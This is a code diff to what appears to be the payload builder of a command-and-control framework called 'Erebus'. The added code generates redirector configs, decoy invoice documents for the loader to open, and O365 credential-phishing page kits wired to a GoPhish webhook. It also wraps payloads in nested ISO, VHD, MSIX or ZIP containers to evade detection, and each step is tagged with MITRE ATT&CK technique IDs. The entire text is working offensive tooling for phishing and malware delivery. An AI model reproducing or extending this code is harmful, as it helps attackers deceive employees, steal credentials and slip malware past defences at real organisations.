+                        decoy_url=self.get_parameter("7.3 Redirector Decoy URL") or "https://www.microsoft.com/en-us/",
+                    )
+                    await self._build_step(
+                        "[T1090.002] - Redirector Configs",
+                        f"Generated Apache/Nginx/Caddy/Terraform redirector configs in redirector_configs/",
+                        success=True,
+                    )
+                except Exception as _redir_ex:
+                    await self._build_step(
+                        "[T1090.002] - Redirector Configs",
+                        f"Redirector config generation failed: {_redir_ex}",
+                        success=False,
+                    )
+
+            # Decoy document generation (optional, placed in payload/ dir for loader to open)
+            if self.get_parameter("8.0 Generate Decoy Document"):
+                try:
+                    _decoy_dir = Path(agent_build_path) / "payload"
+                    create_decoy_document(
+                        output_dir=str(_decoy_dir),
+                        template=self.get_parameter("8.1 Decoy Template") or "invoice",
+                        company_name=self.get_parameter("8.2 Decoy Company Name") or "Acme Corporation",
+                        recipient=self.get_parameter("8.3 Decoy Recipient") or "Valued Employee",
+                        output_format=self.get_parameter("8.4 Decoy Format") or "docx",
+                    )
+                    await self._build_step(
+                        "[T1566.001] - Decoy Document",
+                        f"Generated {self.get_parameter('8.1 Decoy Template')} decoy document in payload/",
+                        success=True,
+                    )
+                except Exception as _decoy_ex:
+                    await self._build_step(
+                        "[T1566.001] - Decoy Document",
+                        f"Decoy document generation failed: {_decoy_ex}",
+                        success=False,
+                    )
+
+            # Phishing page kit generation (optional, bundled into redirector_configs/ dir)
+            if self.get_parameter("9.0 Generate Phishing Page"):
+                try:
+                    _phish_out = Path(agent_build_path) / "phishing_kit"
+                    create_phishing_page(
+                        output_dir=str(_phish_out),
+                        template=self.get_parameter("9.1 Phishing Template") or "o365",
+                        org_name=self.get_parameter("9.2 Phishing Org Name") or "Acme Corporation",
+                        domain=self.get_parameter("9.3 Phishing Domain") or "acme.com",
+                        redirect_url=self.get_parameter("9.4 Phishing Redirect URL") or "https://www.office.com",
+                        gophish_webhook=self.get_parameter("9.5 GoPhish Webhook") or "",
+                    )
+                    await self._build_step(
+                        "[T1566.002] - Phishing Kit",
+                        f"Generated {self.get_parameter('9.1 Phishing Template')} phishing kit in phishing_kit/",
+                        success=True,
+                    )
+                except Exception as _phish_ex:
+                    await self._build_step(
+                        "[T1566.002] - Phishing Kit",
+                        f"Phishing page generation failed: {_phish_ex}",
+                        success=False,
+                    )
+
             # 2. Attempt Containerization
             container_path = await self.containerise_payload(agent_build_path)
 
@@ -4111,31 +5265,55 @@ static size_t key_len = sizeof(key);
                     response.payload = f.read()
 
                 container = self.get_parameter("3.0 Container Type")
+                outer    = (self.get_parameter("3.0T Outer Transport") or "None").strip()
+
+                # Inner container determines filename stem
                 match container:
-                    case "7z":
-                        filename = "payload"
-                        ext = "7z"
-                    case "Zip":
-                        filename = "payload"
-                        ext = "zip"
                     case "MSI":
                         filename = "ErebusInstaller"
-                        ext = "msi"
-                    case "ISO":
-                        filename = "payload"
-                        ext = "iso"
+                        inner_ext = "msi"
                     case "Electron":
                         filename = "ErebusInstaller"
-                        ext = "exe"
-                    case _:
+                        inner_ext = "exe"
+                    case "MSIX" | "AppInstaller":
+                        filename = "ErebusInstaller"
+                        inner_ext = "msix"
+                    case "ISO":
                         filename = "payload"
-                        ext = "exe"
+                        inner_ext = "iso"
+                    case "VHD":
+                        filename = "payload"
+                        inner_ext = "vhd"
+                    case "7z":
+                        filename = "payload"
+                        inner_ext = "7z"
+                    case _:   # Zip and fallback
+                        filename = "payload"
+                        inner_ext = "zip"
 
+                # Outer transport overrides the final file extension
+                match outer:
+                    case "ISO":
+                        ext = "iso"
+                    case "VHD":
+                        ext = "vhd"
+                    case "ZIP":
+                        ext = "zip"
+                    case "7z":
+                        ext = "7z"
+                    case _:
+                        ext = inner_ext
+
+                chain_label = f"{container} → {outer}" if outer != "None" else container
                 response.updated_filename = f"{filename}.{ext}"
                 response.status = BuildStatus.Success
-                response.build_message = f"Success! Containerized ({container})"
+                response.build_message = f"Success! Containerized ({chain_label})"
 
-                await self._build_step("[T1027] - Containerising", f"Payload packaged into {container} container", success=True)
+                await self._build_step(
+                    "[T1027] - Containerising",
+                    f"Payload packaged: {chain_label}",
+                    success=True,
+                )
 
             return response
 
